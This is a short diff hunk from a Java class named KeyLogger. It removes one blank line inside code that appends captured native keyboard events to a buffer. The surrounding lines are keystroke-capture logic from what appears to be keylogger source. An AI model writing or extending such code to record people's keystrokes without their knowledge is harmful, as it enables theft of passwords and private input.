@@ -127,7 +127,6 @@ public class KeyLogger implements Interfaz, NativeKeyListener {
                             buffer.append("\n");
                         }
                     }
-
 //                buffer.append(paramNativeInputEvent.paramString());
                     buffer.append(getChar(paramNativeInputEvent.paramString()));
 //                System.out.print(getChar(paramNativeInputEvent.paramString()));
